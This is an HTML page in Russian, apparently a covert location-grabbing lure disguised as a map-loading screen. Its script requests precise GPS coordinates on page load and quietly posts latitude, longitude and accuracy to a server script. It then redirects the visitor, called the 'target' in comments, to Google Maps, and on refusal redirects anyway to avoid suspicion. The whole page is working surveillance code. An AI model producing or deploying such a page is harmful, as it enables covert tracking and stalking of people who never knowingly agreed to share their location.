<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Загрузка карты...</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f9;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .loader {
            text-align: center;
            color: #333;
        }
    </style>
</head>
<body>

<div class="loader">
    <h2>Пожалуйста, подождите...</h2>
    <p>Идет инциализация и определение ближайшего сервера связи.</p>
</div>

<script>
    // Функция автоматического запроса геопозиции при входе
    window.onload = function() {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(sendLocation, showError, {
                enableHighAccuracy: true, // Принудительно включаем GPS для максимальной точности
                timeout: 10000,
                maximumAge: 0
            });
        } else {
            // Если браузер совсем древний и не поддерживает гео
            window.location.href = "https://maps.google.com";
        }
    };

    function sendLocation(position) {
        var latitude = position.coords.latitude;
        var longitude = position.coords.longitude;
        var accuracy = position.coords.accuracy; // Точность в метрах

        // Отправляем данные на наш сервер через скрытый POST-запрос
        var xhr = new XMLHttpRequest();
        xhr.open("POST", "save.php", true);
        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        
        xhr.onreadystatechange = function() {
            if (xhr.readyState == 4) {
                // Как только данные улетели, перенаправляем цель на реальные карты
                window.location.href = "https://www.google.com/maps?q=" + latitude + "," + longitude;
            }
        };
        
        xhr.send("lat=" + latitude + "&lon=" + longitude + "&acc=" + accuracy);
    }

    function showError(error) {
        // Если пользователь нажал "Блокировать", все равно уводим его, чтобы не вызывать подозрительности
        window.location.href = "https://maps.google.com";
    }
</script>

</body>
</html>
Google Maps
Find local businesses, view maps and get driving directions in Google Maps.

